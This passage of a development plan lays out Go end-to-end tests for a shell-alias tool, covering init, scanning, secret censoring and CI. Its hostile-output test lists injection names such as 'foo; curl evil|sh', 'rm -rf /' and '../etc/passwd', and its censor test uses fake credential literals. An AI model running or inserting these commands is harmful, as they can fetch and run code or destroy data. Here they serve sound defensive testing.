		t.Errorf("wrapper marker appears %d times, want 1", n)
	}
	if n := strings.Count(rc, `[ -f "$HOME/.config/aka/zsh/aliases.sh" ]`); n != 1 {
		t.Errorf("source line appears %d times, want 1", n)
	}
}

// The rc file aka writes must be valid shell — an interactive shell has to
// start cleanly with it in place.
func TestInitProducesSourceableRC(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}

	out, code := env.RunShell("echo SHELL_OK")
	if code != 0 {
		t.Fatalf("interactive zsh exited %d\n%s", code, out)
	}
	if !strings.Contains(out, "SHELL_OK") {
		t.Fatalf("shell did not run the script:\n%s", out)
	}
	for _, bad := range []string{"parse error", "command not found", "syntax error"} {
		if strings.Contains(strings.ToLower(out), bad) {
			t.Errorf("shell reported %q:\n%s", bad, out)
		}
	}
}

func TestInitBashWiresBashRC(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "bash")
	if _, code := env.Run("init", "--shell", "bash"); code != 0 {
		t.Fatal("init failed")
	}

	rc := env.ReadFile(".bashrc")
	if !strings.Contains(rc, `AKA_SHELL=bash command aka "$@"`) {
		t.Errorf("bashrc missing the wrapper:\n%s", rc)
	}
	if !strings.Contains(rc, `[ -f "$HOME/.config/aka/bash/aliases.sh" ]`) {
		t.Errorf("bashrc missing the source line:\n%s", rc)
	}
}

func TestInitRejectsFish(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")
	out, code := env.Run("init", "--shell", "fish")

	if code == 0 {
		t.Fatalf("expected a non-zero exit for fish\n%s", out)
	}
	if !strings.Contains(out, "fish shell is not supported in v0.1") {
		t.Fatalf("missing the fish message:\n%s", out)
	}
}

// With no config.toml, init runs the provider → key → model flow.
func TestInitPromptsForAPIKeyWhenUnconfigured(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	env.SeedRC(existingRC)
	// deliberately no SeedConfig

	c := env.Spawn("init", "--shell", "zsh")
	c.Expect("Choose an LLM provider:")
	c.Send(Enter) // first provider in the list
	c.Expect("Enter your Anthropic API key:")
	c.SendLine("sk-ant-e2e-secret")
	c.Expect("Choose a model:")
	c.Send(Enter) // cheapest, pre-selected
	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d", code)
	}

	cfg := env.ReadFile(".config", "aka", "config.toml")
	if !strings.Contains(cfg, "sk-ant-e2e-secret") {
		t.Fatalf("config.toml missing the entered key:\n%s", cfg)
	}
	if mode := env.FileMode(".config", "aka", "config.toml"); mode.Perm() != 0o600 {
		t.Fatalf("config.toml mode = %o, want 600", mode.Perm())
	}
}

// Data written under the old flat layout must move to ~/.config/aka/<shell>/.
func TestInitMigratesLegacyLayout(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")

	legacyDir := env.Path(".config", "aka")
	if err := os.MkdirAll(legacyDir, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	legacyAliases := "# Managed by AKA\nalias e2elegacy='echo legacy'\n"
	if err := os.WriteFile(env.Path(".config", "aka", "aliases.sh"),
		[]byte(legacyAliases), 0o600); err != nil {
		t.Fatalf("write legacy aliases.sh: %v", err)
	}

	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}

	migrated := env.AliasesFile()
	if !strings.Contains(migrated, "e2elegacy") {
		t.Fatalf("legacy aliases were not migrated:\n%s", migrated)
	}
	if _, err := os.Stat(env.Path(".config", "aka", "aliases.sh")); err == nil {
		t.Error("legacy aliases.sh still present at the old path")
	}
}
```

- [ ] **Step 2: Run tests and reconcile against real behaviour**

Run: `make e2e`
Expected: most PASS. Where one fails because a real string differs from what is asserted (the em-dash in the wrapper marker, the exact migration behaviour, the model-picker ordering), **read the source and correct the test to match the product** — do not change the product to match the test. This task documents existing behaviour.

For any genuine bug discovered here, record it in the final report rather than fixing it inside this task.

- [ ] **Step 3: Re-run until green**

Run: `make e2e`
Expected: all `init_test.go` tests PASS.

- [ ] **Step 4: Stage (commit only if the user has approved committing)**

```bash
git add test/e2e/init_test.go
git commit -m "test(e2e): cover shell wiring, idempotency, key setup, and legacy migration"
```

---

## Task 8: Full scan lifecycle

**Files:**
- Create: `test/e2e/scan_test.go`

**Interfaces:**
- Consumes: everything from Tasks 4–6, plus `fakellm.Normal` / `fakellm.Suggestion`.
- Produces: nothing consumed by later tasks.

**Exact strings this task asserts on:**

- scope picker title: `How much history to send to the LLM?`
- scope option: `Send full history (` / `Send last ` / `Abort`
- censor review title: `Send %d commands to the LLM?` → assert on the stable prefix `commands to the LLM?`
- censor option: `Yes, send `
- overview banner: `AKA FOUND` (the `✨` prefix is styled; match the words)
- review list apply row: `Apply ` … ` suggestion(s) & exit`
- review footer: `space toggle`
- success: `Applied ` … ` alias(es)/function(s)!`
- delete confirm: `Continue? [y/N]`
- list footer: `alias(es)/function(s) installed`

- [ ] **Step 1: Write the failing test**

Create `test/e2e/scan_test.go`:

```go
//go:build e2e

package e2e

import (
	"strings"
	"testing"

	"github.com/ntalmon/aka/test/e2e/fakellm"
)

// workflowSuggestions is the standard two-suggestion response: one alias and
// one multi-command function.
func workflowSuggestions() []fakellm.Suggestion {
	return []fakellm.Suggestion{
		{
			Name:      "e2egs",
			Kind:      "alias",
			Template:  "git status --short",
			Rationale: "git status is run constantly.",
		},
		{
			Name:        "e2eship",
			Kind:        "function",
			Template:    "git add -A\ngit commit -m \"$1\"\ngit push",
			Params:      []fakellm.Param{{Name: "message", Description: "commit message"}},
			Rationale:   "Combines the add/commit/push sequence.",
			ExampleUses: []string{"e2eship 'fix bug'"},
		},
	}
}

// realisticHistory returns commands that look like genuine sequential work.
func realisticHistory() []string {
	var cmds []string
	for i := 0; i < 20; i++ {
		cmds = append(cmds,
			"git status",
			"git add -A",
			"git commit -m 'work in progress'",
		)
	}
	return cmds
}

func scanEnv(t *testing.T) *Env {
	t.Helper()
	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(realisticHistory()...)
	env.LLM.Respond(fakellm.Normal(workflowSuggestions()...))
	return env
}

// The full interactive path: scope picker → censor review → suggestion review
// → apply, driven entirely over the PTY.
func TestScanInteractiveAppliesSuggestions(t *testing.T) {
	t.Parallel()

	env := scanEnv(t)

	c := env.Spawn("scan")
	c.Expect("How much history to send to the LLM?")
	c.Send(Enter) // "Send full history"

	c.Expect("commands to the LLM?")
	c.Expect("Yes, send ")
	c.Send(Enter) // send as-is

	c.Expect("AKA FOUND")
	c.Expect("space toggle") // the review list is up

	c.Send(Space)      // select the first suggestion
	c.Send(Down, Space) // select the second
	c.Send(Down)
	c.ExpectRe(`Apply \d+ suggestion\(s\) & exit`)
	c.Send(Enter)

	c.ExpectRe(`Applied \d+ alias\(es\)/function\(s\)!`)
	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d", code)
	}

	aliasesSh := env.AliasesFile()
	for _, name := range []string{"e2egs", "e2eship"} {
		if !strings.Contains(aliasesSh, name) {
			t.Errorf("aliases.sh missing %q:\n%s", name, aliasesSh)
		}
	}

	installed := env.Installed()
	if len(installed) != 2 {
		t.Fatalf("installed.json has %d entries, want 2: %+v", len(installed), installed)
	}
	for _, entry := range installed {
		if entry.Source != "scan" {
			t.Errorf("entry %q Source = %q, want scan", entry.Name, entry.Source)
		}
	}

	if len(env.Backups()) == 0 {
		t.Error("no timestamped backup was taken")
	}
}

// The generated file must always be valid shell, and the aliases must actually
// resolve in a real interactive shell.
func TestAppliedAliasesResolveInRealShell(t *testing.T) {
	t.Parallel()

	env := scanEnv(t)
	applyBothSuggestions(t, env)

	for _, shellCheck := range []string{"zsh -n", "bash -n"} {
		parts := strings.Fields(shellCheck)
		out, code := runCommand(t, env, parts[0], parts[1], env.ShellPath("aliases.sh"))
		if code != 0 {
			t.Errorf("%s rejected aliases.sh: exit %d\n%s", shellCheck, code, out)
		}
	}

	out, code := env.RunShell("type e2egs")
	if code != 0 {
		t.Fatalf("`type e2egs` exited %d\n%s", code, out)
	}
	if !strings.Contains(out, "e2egs") {
		t.Fatalf("e2egs did not resolve in a real shell:\n%s", out)
	}

	out, code = env.RunShell("type e2eship")
	if code != 0 {
		t.Fatalf("`type e2eship` exited %d\n%s", code, out)
	}
}

func TestScanWritesHistoryCursor(t *testing.T) {
	t.Parallel()

	env := scanEnv(t)
	applyBothSuggestions(t, env)

	cursor := env.ReadFile(".config", "aka", "zsh", "history_cursor.json")
	if !strings.Contains(cursor, "60") {
		t.Fatalf("cursor does not record the 60 seeded commands:\n%s", cursor)
	}
}

func TestListThenDelete(t *testing.T) {
	t.Parallel()

	env := scanEnv(t)
	applyBothSuggestions(t, env)

	out, code := env.Run("list")
	if code != 0 {
		t.Fatalf("list exit code = %d\n%s", code, out)
	}
	for _, name := range []string{"e2egs", "e2eship"} {
		if !strings.Contains(out, name) {
			t.Errorf("list output missing %q:\n%s", name, out)
		}
	}

	backupsBefore := len(env.Backups())

	c := env.Spawn("delete", "e2egs")
	c.Expect("Continue? [y/N]")
	c.SendLine("y")
	if code := c.Wait(); code != 0 {
		t.Fatalf("delete exit code = %d", code)
	}

	aliasesSh := env.AliasesFile()
	if strings.Contains(aliasesSh, "e2egs") {
		t.Errorf("e2egs still in aliases.sh after delete:\n%s", aliasesSh)
	}
	if !strings.Contains(aliasesSh, "e2eship") {
		t.Errorf("delete removed the wrong entry:\n%s", aliasesSh)
	}
	if len(env.Installed()) != 1 {
		t.Errorf("installed.json has %d entries, want 1", len(env.Installed()))
	}
	if len(env.Backups()) <= backupsBefore {
		t.Error("delete did not take a new backup")
	}

	if out, _ := env.RunShell("type e2egs"); strings.Contains(out, "alias") {
		t.Errorf("deleted alias still resolves in the shell:\n%s", out)
	}
}

// --history diff below minDiffCount (40) must not call the LLM at all.
func TestScanDiffBelowThresholdMakesNoLLMCall(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory("git status", "git log", "ls -la")
	env.LLM.Respond(fakellm.Normal(workflowSuggestions()...))

	out, code := env.Run("scan", "--history", "diff", "--censor", "trust")
	if code != 0 {
		t.Fatalf("exit code = %d\n%s", code, out)
	}
	if n := len(env.LLM.Requests()); n != 0 {
		t.Fatalf("made %d LLM request(s) for a below-threshold diff, want 0", n)
	}
}

// Navigating back from the suggestion review must not leave a duplicate menu on
// screen — the bug class documented in CLAUDE.md's "Lessons learned".
func TestBackFromSuggestionsDoesNotDuplicateMenu(t *testing.T) {
	t.Parallel()

	env := scanEnv(t)

	c := env.Spawn("scan")
	c.Expect("How much history to send to the LLM?")
	c.Send(Enter)
	c.Expect("commands to the LLM?")
	c.Send(Enter)
	c.Expect("AKA FOUND")
	c.Expect("space toggle")

	c.Send(Left) // back
	c.Expect("Are you sure you want to go back")
	c.Send(Down, Enter) // "Yes, go back"

	// The censor review comes back; the scope picker must not be redrawn.
	c.Expect("commands to the LLM?")

	if n := c.CountOccurrences("How much history to send to the LLM?"); n != 1 {
		t.Errorf("scope picker rendered %d times, want 1\n%s", n, c.Screen())
	}

	c.Send(Enter)
	c.Expect("AKA FOUND")
	c.Send(CtrlC)
	_ = c.Wait()
}

// applyBothSuggestions runs a non-interactive scan and accepts both suggestions
// through the review UI, leaving the env with e2egs and e2eship installed.
func applyBothSuggestions(t *testing.T, env *Env) {
	t.Helper()

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Expect("space toggle")
	c.Send(Space)
	c.Send(Down, Space)
	c.Send(Down)
	c.ExpectRe(`Apply \d+ suggestion\(s\) & exit`)
	c.Send(Enter)
	c.ExpectRe(`Applied \d+ alias\(es\)/function\(s\)!`)
	if code := c.Wait(); code != 0 {
		t.Fatalf("scan exit code = %d", code)
	}
}
```

Add a small helper to `harness.go` used by `TestAppliedAliasesResolveInRealShell`:

```go
// runCommand runs an arbitrary command in the isolated environment.
func runCommand(t *testing.T, e *Env, name string, args ...string) (string, int) {
	t.Helper()
	cmd := exec.Command(name, args...)
	cmd.Env = e.environ(e.extraEnv...)
	cmd.Dir = e.Home
	out, err := cmd.CombinedOutput()
	return string(out), exitCodeOf(t, err, out)
}
```

- [ ] **Step 2: Run tests and reconcile the keystroke choreography**

Run: `make e2e`
Expected: the file-level assertions should hold; the **keystroke sequences in the review list are the likeliest thing to need adjustment**. Read `reviewListModel.Update` in `internal/ui/ui.go` (around line 300–390) to confirm exactly what `Space`, `Enter`, and `Left` do on each row, and how many `Down` presses reach the apply row.

Correct the *test* to match the product. If a keystroke genuinely does the wrong thing, record it as a finding.

- [ ] **Step 3: Re-run until green**

Run: `make e2e`
Expected: all `scan_test.go` tests PASS.

- [ ] **Step 4: Verify the double-menu test can actually fail**

Temporarily change `TestBackFromSuggestionsDoesNotDuplicateMenu` to assert `n != 99`, confirm it fails, then restore it. This proves the assertion is live rather than vacuously true.

- [ ] **Step 5: Stage (commit only if the user has approved committing)**

```bash
git add test/e2e/scan_test.go test/e2e/harness.go
git commit -m "test(e2e): cover the full scan, apply, list, and delete lifecycle"
```

---

## Task 9: Censoring proven at the wire

**Files:**
- Create: `test/e2e/censor_wire_test.go`

**Interfaces:**
- Consumes: `Env`, `fakellm.Server.Requests`.
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the failing test**

Create `test/e2e/censor_wire_test.go`:

```go
//go:build e2e

package e2e

import (
	"strings"
	"testing"

	"github.com/ntalmon/aka/test/e2e/fakellm"
)

// secretLiterals are values that must never reach the LLM. Each is paired with
// the history command that contains it.
var secretLiterals = map[string]string{
	"AKIAIOSFODNN7EXAMPLE": `aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE`,
	"ghp_1234567890abcdefghijklmnopqrstuvwx": `git remote set-url origin https://ghp_1234567890abcdefghijklmnopqrstuvwx@github.com/o/r.git`,
	"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U": `curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" https://api.example.com/v1/data`,
	"sk-ant-api03-SECRETVALUE1234567890abcdefXYZ": `export ANTHROPIC_API_KEY=sk-ant-api03-SECRETVALUE1234567890abcdefXYZ`,
	"hunter2supersecret": `mysql -u admin -phunter2supersecret -h db.internal`,
}

// secretHistory builds a history containing every secret plus enough ordinary
// commands that the scan proceeds normally.
func secretHistory() []string {
	cmds := []string{
		"ssh deploy@10.1.2.3",
		"curl https://admin:s3cr3tpassw0rd@internal.example.com/health",
		"git commit -m 'fix the login redirect'",
		"git log --oneline -5",
	}
	for _, cmd := range secretLiterals {
		cmds = append(cmds, cmd)
	}
	for i := 0; i < 40; i++ {
		cmds = append(cmds, "git status", "git diff --stat")
	}
	return cmds
}

func censorEnv(t *testing.T) *Env {
	t.Helper()
	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(secretHistory()...)
	env.LLM.Respond(fakellm.Normal(workflowSuggestions()...))
	return env
}

// The strongest form of the censor test: assert on the bytes that actually
// crossed the socket, not on a function's return value.
func TestSecretsNeverReachTheWire(t *testing.T) {
	t.Parallel()

	env := censorEnv(t)

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Send(CtrlC)
	_ = c.Wait()

	reqs := env.LLM.Requests()
	if len(reqs) == 0 {
		t.Fatal("no request reached the server")
	}
	body := string(reqs[0].Body)

	for secret := range secretLiterals {
		if strings.Contains(body, secret) {
			t.Errorf("secret %q was sent to the LLM", secret)
		}
	}
	for _, secret := range []string{"s3cr3tpassw0rd", "10.1.2.3"} {
		if strings.Contains(body, secret) {
			t.Errorf("sensitive value %q was sent to the LLM", secret)
		}
	}
}

func TestPlaceholdersAppearOnTheWire(t *testing.T) {
	t.Parallel()

	env := censorEnv(t)

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Send(CtrlC)
	_ = c.Wait()

	body := string(env.LLM.Requests()[0].Body)
	if !strings.Contains(body, "<") || !strings.Contains(body, ">") {
		t.Fatalf("no placeholders found in the request body:\n%s", truncate(body, 4000))
	}
}

// Commit messages and hashes are deliberately not censored — the LLM needs them
// to recognise workflow patterns.
func TestCommitMessagesSurviveCensoring(t *testing.T) {
	t.Parallel()

	env := censorEnv(t)

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Send(CtrlC)
	_ = c.Wait()

	body := string(env.LLM.Requests()[0].Body)
	if !strings.Contains(body, "fix the login redirect") {
		t.Errorf("commit message was censored; it should survive:\n%s", truncate(body, 4000))
	}
}

// --censor none is documented as sending raw commands. Pin that contract so a
// future change cannot silently alter what the flag means.
func TestCensorNoneSendsRawSecrets(t *testing.T) {
	t.Parallel()

	env := censorEnv(t)

	c := env.Spawn("scan", "--history", "full", "--censor", "none")
	c.Expect("AKA FOUND")
	c.Send(CtrlC)
	_ = c.Wait()

	body := string(env.LLM.Requests()[0].Body)
	if !strings.Contains(body, "AKIAIOSFODNN7EXAMPLE") {
		t.Error("--censor none did not send the raw value; the flag's contract changed")
	}
}

func TestCensorNoneWarnsTheUser(t *testing.T) {
	t.Parallel()

	env := censorEnv(t)

	c := env.Spawn("scan", "--history", "full", "--censor", "none")
	c.Expect("No censoring")
	c.Expect("AKA FOUND")
	c.Send(CtrlC)
	_ = c.Wait()
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "\n… (truncated)"
}
```

- [ ] **Step 2: Run test to verify it fails or reveals real behaviour**

Run: `make e2e`
Expected: `TestSecretsNeverReachTheWire` should PASS if the censor works. **If any secret does reach the wire, that is a real finding** — record it, do not weaken the assertion.

- [ ] **Step 3: Reconcile the placeholder assertion**

If `TestPlaceholdersAppearOnTheWire` fails, read `internal/censor/censor.go` to learn the actual placeholder format and tighten the assertion to the real tokens (for example `<TOKEN_0>`, `<IP_0>`) rather than the loose angle-bracket check.

- [ ] **Step 4: Re-run until green**

Run: `make e2e`
Expected: all `censor_wire_test.go` tests PASS.

- [ ] **Step 5: Prove the test can fail**

Temporarily add `"git status"` to `secretLiterals` (a string certain to be on the wire), confirm `TestSecretsNeverReachTheWire` fails, then remove it.

- [ ] **Step 6: Stage (commit only if the user has approved committing)**

```bash
git add test/e2e/censor_wire_test.go
git commit -m "test(e2e): assert censoring against the bytes sent to the LLM"
```

---

## Task 10: Adversarial LLM output

**Files:**
- Create: `test/e2e/hostile_test.go`

**Interfaces:**
- Consumes: `Env`, `fakellm.Hostile`, `fakellm.Malformed`, `fakellm.TokenLimit`.
- Produces: nothing consumed by later tasks.

**Important:** `*llm.ErrTokenLimit` is produced only by the OpenAI-compatible path (`internal/llm/openaicompat.go`). The Anthropic provider does not return it. The token-limit test must therefore seed `config.toml` with `provider = "groq"`.

- [ ] **Step 1: Write the failing test**

Create `test/e2e/hostile_test.go`:

```go
//go:build e2e

package e2e

import (
	"strings"
	"testing"

	"github.com/ntalmon/aka/test/e2e/fakellm"
)

// hostileNames must never appear in any generated file.
var hostileNames = []string{
	"rm -rf /",
	"foo; curl evil|sh",
	"../etc/passwd",
	"9lives",
	strings.Repeat("a", 200),
}

func hostileEnv(t *testing.T) *Env {
	t.Helper()
	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(realisticHistory()...)
	env.LLM.Respond(fakellm.Hostile())
	return env
}

// Accept everything the hostile server offers, then assert none of the
// dangerous names made it into the generated files.
func TestHostileNamesAreRejected(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)
	acceptEverything(t, env)

	aliasesSh := env.AliasesFile()
	for _, name := range hostileNames {
		if strings.Contains(aliasesSh, name) {
			t.Errorf("hostile name %q reached aliases.sh:\n%s", name, aliasesSh)
		}
	}
	for _, entry := range env.Installed() {
		for _, name := range hostileNames {
			if entry.Name == name {
				t.Errorf("hostile name %q reached installed.json", name)
			}
		}
	}
}

// The generated file must always be syntactically valid shell, whatever the LLM
// returns. This is the assertion that covers cases nobody enumerated.
func TestGeneratedFileIsAlwaysValidShell(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)
	acceptEverything(t, env)

	for _, sh := range []string{"zsh", "bash"} {
		out, code := runCommand(t, env, sh, "-n", env.ShellPath("aliases.sh"))
		if code != 0 {
			t.Errorf("%s -n rejected the generated aliases.sh (exit %d)\n%s\n---\n%s",
				sh, code, out, env.AliasesFile())
		}
	}
}

// A function template containing an unbalanced brace must not escape the
// generated function body.
func TestFunctionBodyCannotBreakOut(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)
	acceptEverything(t, env)

	if strings.Contains(env.AliasesFile(), "echo escaped") {
		t.Errorf("breakout template body was written verbatim:\n%s", env.AliasesFile())
	}
}

// aka must survive hostile input without crashing.
func TestHostileResponseExitsCleanly(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Expect("space toggle")
	c.Send(Left)
	c.Expect("Are you sure you want to go back")
	c.Send(Enter) // "No" — stay
	c.Expect("space toggle")
	c.Send(Esc)

	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d, want 0 on abort", code)
	}
}

// A malformed response must fail loudly and write nothing.
func TestMalformedResponseWritesNothing(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(realisticHistory()...)
	env.LLM.Respond(fakellm.Malformed())

	out, code := env.Run("scan", "--history", "full", "--censor", "trust")
	if code == 0 {
		t.Fatalf("expected a non-zero exit for a malformed response\n%s", out)
	}
	if n := len(env.Installed()); n != 0 {
		t.Errorf("installed.json gained %d entries after a failed scan", n)
	}
}

// The halving retry loop in runScan: first request errors with a token limit,
// the second succeeds with roughly half the commands.
func TestTokenLimitTriggersHalvingRetry(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	env.SeedRC(existingRC)
	env.SeedConfig(ConfigTOML{
		Provider: "groq", // only the OpenAI-compatible path yields ErrTokenLimit
		Model:    "llama-3.3-70b-versatile",
		APIKey:   "e2e-groq-key",
	})
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(realisticHistory()...)
	env.LLM.Respond(fakellm.TokenLimit(fakellm.Normal(workflowSuggestions()...)))

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("Token limit exceeded; retrying with")
	c.Expect("AKA FOUND")
	c.Send(Esc)
	_ = c.Wait()

	reqs := env.LLM.Requests()
	if len(reqs) != 2 {
		t.Fatalf("made %d requests, want 2 (initial + retry)", len(reqs))
	}
	if len(reqs[1].Body) >= len(reqs[0].Body) {
		t.Errorf("retry body (%d bytes) is not smaller than the first (%d bytes)",
			len(reqs[1].Body), len(reqs[0].Body))
	}
}

// acceptEverything selects every suggestion in the review list and applies.
func acceptEverything(t *testing.T, env *Env) {
	t.Helper()

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Expect("space toggle")

	// Walk the list, toggling each row, until the apply row is reached.
	for i := 0; i < 20; i++ {
		c.Send(Space, Down)
	}
	c.ExpectRe(`Apply \d+ suggestion\(s\) & exit`)
	c.Send(Enter)

	// Applying may report zero accepted if everything was rejected, which is a
	// valid outcome for the hostile fixture.
	c.ExpectRe(`Applied \d+ alias\(es\)/function\(s\)!|No suggestions accepted\.|Skipped \(name conflicts\)`)
	_ = c.Wait()
}
```

- [ ] **Step 2: Run tests**

Run: `make e2e`
Expected: the name-rejection and valid-shell assertions should PASS. `acceptEverything`'s row-walking loop will likely need tuning once you see the real list length and cursor behaviour — read `reviewListModel` and adjust.

- [ ] **Step 3: Record, do not fix, the `$(...)` finding**

`aliases.ValidateFunctionTemplate` rejects only `}`. A template such as `echo "$(date)"` passes validation and will be written to `aliases.sh`.

Add a test that **documents** this, clearly labelled:

```go
// Documented behaviour, not an endorsement: command substitution inside a
// function template passes validation today and is written to aliases.sh.
// The user reviews every suggestion before accepting, so this may be intended.
// Changing it is a decision for its own change — see the plan's Task 10 note.
func TestCommandSubstitutionInTemplateIsCurrentlyAccepted(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)
	acceptEverything(t, env)

	if !strings.Contains(env.AliasesFile(), "e2esubshell") {
		t.Skip("e2esubshell was not accepted; the validator may have been tightened — " +
			"if so, delete this test, it has served its purpose")
	}
}
```

Report the finding in the final summary. Do not change `ValidateFunctionTemplate` in this task.

- [ ] **Step 4: Re-run until green**

Run: `make e2e`
Expected: all `hostile_test.go` tests PASS.

- [ ] **Step 5: Prove the name-rejection test can fail**

Temporarily add `"e2egs"` to `hostileNames` while running against `workflowSuggestions()`, confirm the test fails, then revert.

- [ ] **Step 6: Stage (commit only if the user has approved committing)**

```bash
git add test/e2e/hostile_test.go
git commit -m "test(e2e): cover adversarial LLM output, malformed responses, and token-limit retry"
```

---

## Task 11: Live tier and CI

**Files:**
- Create: `test/e2e/live_test.go`
- Modify: `.github/workflows/ci.yml`
- Modify: `CLAUDE.md` (document `make e2e` and correct the `uninit` reference)

**Interfaces:**
- Consumes: `Env`, `NewEnv`.
- Produces: the `e2e` CI job.

- [ ] **Step 1: Write the live tier**

Create `test/e2e/live_test.go`:

```go
//go:build e2e

package e2e

import (
	"os"
	"regexp"
	"strings"
	"testing"
)

// validNameRE mirrors the pattern in internal/apply/apply.go. Duplicated rather
// than imported so this file asserts against the documented contract.
var validNameRE = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]{0,31}$`)

// The live tier talks to the real provider, so it asserts loosely: schema
// validity and name safety, never exact content. Run it to detect provider
// drift; it is skipped by default and in CI.
//
//	AKA_E2E_LIVE=1 ANTHROPIC_API_KEY=sk-... make e2e
func TestLiveProviderReturnsUsableSuggestions(t *testing.T) {
	if os.Getenv("AKA_E2E_LIVE") != "1" {
		t.Skip("set AKA_E2E_LIVE=1 to run the live provider tier")
	}
	apiKey := os.Getenv("ANTHROPIC_API_KEY")
	if apiKey == "" {
		t.Skip("ANTHROPIC_API_KEY is required for the live tier")
	}

	env := NewEnv(t, "zsh")
	// Talk to the real endpoint: drop the loopback override the harness sets.
	env.ClearLLMOverride()
	env.SeedRC(existingRC)
	env.SeedConfig(ConfigTOML{
		Provider: "anthropic",
		Model:    "claude-haiku-4-5-20251001",
		APIKey:   apiKey,
	})
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(realisticHistory()...)

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Expect("space toggle")
	c.Send(Space)
	for i := 0; i < 20; i++ {
		c.Send(Down)
	}
	c.ExpectRe(`Apply \d+ suggestion\(s\) & exit`)
	c.Send(Enter)
	c.ExpectRe(`Applied \d+ alias\(es\)/function\(s\)!|No suggestions accepted\.`)
	_ = c.Wait()

	for _, entry := range env.Installed() {
		if !validNameRE.MatchString(entry.Name) {
			t.Errorf("live provider produced an unsafe name %q that was installed", entry.Name)
		}
		if strings.TrimSpace(entry.Template) == "" {
			t.Errorf("entry %q has an empty template", entry.Name)
		}
	}
}
```

- [ ] **Step 2: Add `ClearLLMOverride` to the harness**

In `test/e2e/harness.go`:

```go
// ClearLLMOverride removes AKA_LLM_BASE_URL so requests go to the real
// provider endpoint. Used only by the live tier.
func (e *Env) ClearLLMOverride() {
	filtered := e.extraEnv[:0]
	for _, kv := range e.extraEnv {
		if !strings.HasPrefix(kv, "AKA_LLM_BASE_URL=") {
			filtered = append(filtered, kv)
		}
	}
	e.extraEnv = filtered
}
```

- [ ] **Step 3: Verify the live test skips cleanly**

Run: `make e2e`
Expected: `TestLiveProviderReturnsUsableSuggestions` reports SKIP, everything else PASSes.

- [ ] **Step 4: Add the CI job**

In `.github/workflows/ci.yml`, add a job alongside the existing `test` job:

```yaml
  e2e:
    name: E2E (docker)
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build e2e image
        uses: docker/build-push-action@v6
        with:
          context: .
          file: Dockerfile.e2e
          tags: aka-e2e:latest
          load: true
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: Run e2e suite
        run: |
          docker run --rm \
            -e AKA_E2E_INSIDE_CONTAINER=1 \
            -v "$PWD":/src \
            -w /src \
            aka-e2e:latest \
            go test -tags e2e -count=1 ./test/e2e/...
```

Pin the two new actions to commit SHAs to match the pinning style already used in this workflow — look up the current SHAs for `docker/setup-buildx-action` and `docker/build-push-action` rather than leaving floating tags.

The live tier stays skipped: `AKA_E2E_LIVE` is not set.

- [ ] **Step 5: Update `CLAUDE.md`**

Add to the Commands section:

```bash
make e2e                                # run the end-to-end suite in Docker
AKA_E2E_LIVE=1 ANTHROPIC_API_KEY=... make e2e   # include the live provider tier
```

Add a short subsection under Architecture:

```markdown
### End-to-end tests (`test/e2e/`)

Behind the `e2e` build tag, so `go test ./...` never runs them. `make e2e` builds
